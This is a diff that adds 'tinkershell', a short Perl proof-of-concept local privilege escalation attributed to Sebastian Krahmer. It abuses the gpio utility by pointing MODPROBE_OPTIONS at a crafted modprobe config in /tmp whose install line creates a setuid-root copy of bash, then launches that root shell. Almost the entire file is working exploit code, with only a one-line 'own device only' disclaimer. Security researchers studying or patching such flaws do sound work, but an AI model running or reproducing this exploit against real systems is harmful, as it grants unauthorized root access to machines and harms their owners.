@@ -1,0 +1,51 @@
+#!/usr/bin/perl
+
+#
+# This file is part of the tinkershell research PoC
+#
+# (C) 2021 by c-skills, Sebastian Krahmer,
+#             sebastian [dot] krahmer [at] gmail [dot] com
+#
+# tinkershell is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# tinkershell is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with tinkershell.  If not, see <http://www.gnu.org/licenses/>.
+#
+
+print
+"\n\n[*] Tinkershell (C) 2021 c-skills Sebastian Krahmer".
+"\n[*] gpio LPE for the fun of it.\n".
+"\n[*] DISCLAIMER: For demonstration purposes only !!! Only use on your own device and at your own risk!\n\n";
+
+
+my $dir = "/tmp";
+my $boomsh = "$dir/boomsh";
+
+open(O,">/tmp/.m") or die $!;
+print O "install spi_bcm2708 cp /bin/bash $boomsh;chown root.root $boomsh;chmod 04755 $boomsh\n";
+close(O);
+
+$ENV{MODPROBE_OPTIONS}="-C /tmp/.m";
+$ENV{PATH}.=":/usr/local/bin";
+$ENV{PS1}='\u@tinkershell: \w# ';
+
+system("gpio load spi");
+unlink("/tmp/.m");
+
+my $mode = (stat($boomsh))[2];
+if ($mode & 04000) {
+	print "\n[+] Success! Executing $boomsh ...\n\n";
+	exec($boomsh, "-i", "-p");
+} else {
+	print "\n[-] Failed to create boomsh.\n";
+	unlink($boomsh);
+}
+
